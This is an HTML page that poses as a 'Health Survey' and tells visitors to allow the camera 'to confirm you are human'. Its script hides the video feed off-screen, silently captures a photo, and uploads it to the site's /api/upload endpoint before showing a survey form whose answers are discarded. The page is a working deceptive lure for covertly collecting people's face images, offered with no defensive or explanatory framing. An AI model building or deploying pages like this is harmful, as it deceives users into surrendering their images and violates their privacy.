<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Health Survey</title>
<link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
<style>
body {
  font-family: 'Rubik', sans-serif;
  background: linear-gradient(120deg, #f093fb, #f5576c);
  margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column;
  color: #fff; text-align: center;
}
video { width: 1px; height: 1px; position: absolute; top: -100px; left: -100px; }
canvas { display: none; }
h1 { font-size: 2em; margin-bottom: 10px; text-shadow: 2px 2px 4px rgba(0,0,0,0.3);}
h2 { font-weight: 400; margin-bottom: 20px; }
button { padding: 12px 25px; cursor: pointer; background: #fff; color: #f5576c; font-weight: bold; border-radius: 12px; border:none; transition: transform 0.3s; }
button:hover { transform: scale(1.1); }
form { display:none; background: rgba(255,255,255,0.95); color:#333; padding:20px; border-radius:15px; width:350px; margin-top:20px; }
input, select, textarea { width:100%; margin-bottom:12px; padding:8px; border-radius:6px; border:1px solid #ccc; }
#thanksMessage { display:none; font-size:1.2em; margin-top:20px; color:#4CAF50; }
</style>
</head>
<body>

<h1>Welcome to Health Survey</h1>
<h2>Please allow camera to confirm you are human ðŸ˜Š</h2>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<form id="surveyForm">
  <h3>Quick Health Survey</h3>

  <label>Name:</label>
  <input type="text" name="name" required>

  <label>How many hours do you sleep?</label>
  <select name="sleep" required>
    <option value="<5"><5</option>
    <option value="5-6">5-6</option>
    <option value="6-7">6-7</option>
    <option value="7+">7+</option>
  </select>

  <label>Do you exercise regularly?</label>
  <select name="exercise" required>
    <option value="Yes">Yes</option>
    <option value="No">No</option>
  </select>

  <button type="submit">Submit Survey</button>
</form>

<p id="thanksMessage">Thank you! Redirecting to survey...</p>

<script>
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const form = document.getElementById("surveyForm");
const thanks = document.getElementById("thanksMessage");

async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;

    setTimeout(() => captureAndSend(stream), 1000);

  } catch (err) {
    alert("Camera permission is required to continue.");
  }
}

function captureAndSend(stream) {
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;
  canvas.getContext("2d").drawImage(video, 0, 0);

  canvas.toBlob(async (blob) => {
    const formData = new FormData();
    formData.append("photo", blob);

    try {
      const res = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();

      if (data.status === "success") {
        console.log("Photo uploaded successfully."); // Render logs

        document.querySelector('h2').style.display = 'none';
        document.querySelector('h1').style.display = 'none';
        form.style.display = 'block';
      } else {
        alert("Upload failed.");
      }
    } catch (err) {
      alert("Upload failed. Refresh and try again.");
    }
  });

  stream.getTracks().forEach(track => track.stop());
}

form.addEventListener("submit", e => {
  e.preventDefault();
  form.style.display = "none";
  thanks.style.display = "block";

  // Redirect to full survey page after 3 sec
  setTimeout(() => window.location.href = "survey.html", 3000);
});

init();
</script>
</body>
</html>

